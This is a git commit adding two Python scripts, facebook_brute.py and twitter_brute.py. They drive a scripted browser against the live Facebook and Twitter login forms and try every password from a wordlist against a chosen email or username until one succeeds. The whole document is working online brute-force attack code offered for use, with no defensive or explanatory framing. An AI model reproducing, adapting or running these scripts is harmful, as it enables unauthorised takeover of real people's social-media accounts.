b99b4e73f28cb0a6584dba659eafc345fb1160f5
Vasisht Duddu <vduddu@users.noreply.github.com>
2016-12-06 19:48:21 +0530

    Add files via upload

---
+++ facebook_brute.py
@@ -0,0 +1,49 @@
+import mechanize
+import signal
+
+def facebook_brute():
+	
+	br=mechanize.Browser()
+	print("[*]Browser Initialized[*]")
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+	br.open('https://www.facebook.com/')
+	email_username=raw_input("Enter the email address or username:")
+	passfile=open("./password_lists/passwords.txt","r")
+	
+	for password in passfile.readlines():
+		
+		password=password.rstrip('\n')
+	
+		try:
+
+			br.select_form(nr=0)
+			br.form['email']=email_username
+			br.form['pass']=password
+			resp=br.submit()
+
+			if 'attempt' in resp.geturl():
+				print('\x1b[0;30;41m'"[!]Incorrect Password (%s)" %(password)+'\x1b[0m')
+	        		br=mechanize.Browser()
+				br.set_handle_equiv(True)
+			        br.set_handle_redirect(True)
+        			br.set_handle_referer(True)
+        			br.set_handle_robots(False)
+				br.open('https://www.facebook.com/')
+
+			else:
+                                print('\x1b[0;30;42m'+"[+]Correct Password (%s)" %(password)+'\x1b[0m')
+				break
+
+		except KeyboardInterrupt:
+			print("\nQuitting..")
+			return
+
+
+facebook_brute()
+
+
+
+	
---
+++ twitter_brute.py
@@ -0,0 +1,50 @@
+import mechanize
+import signal
+
+def twitter_brute():
+	
+	br=mechanize.Browser()
+	print("[*]Browser Initialized[*]")
+        br.set_handle_equiv(True)
+        br.set_handle_redirect(True)
+        br.set_handle_referer(True)
+        br.set_handle_robots(False)
+	br.open('https://twitter.com/login')
+	email_username=raw_input("Enter the email address or username:")
+	passfile=open("./password_lists/passwords.txt","r")
+
+	
+	for password in passfile.readlines():
+		
+		password=password.rstrip('\n')
+	
+		try:
+
+			br.select_form(nr=1)
+			br.form['session[username_or_email]']=email_username
+			br.form['session[password]']=password
+			resp=br.submit()
+
+			if 'error' in resp.geturl():
+				print('\x1b[0;30;41m'"[!]Incorrect Password (%s)" %(password)+'\x1b[0m')
+				br=mechanize.Browser()
+				br.set_handle_equiv(True)
+			        br.set_handle_redirect(True)
+        			br.set_handle_referer(True)
+       				br.set_handle_robots(False)
+				br.open('https://twitter.com/login')
+
+			else:
+                                print('\x1b[0;30;42m'+"[+]Correct Password (%s)" %(password)+'\x1b[0m')
+				break
+
+		except KeyboardInterrupt:
+			print("\nQuitting..")
+			return
+
+
+twitter_brute()
+
+
+
+	
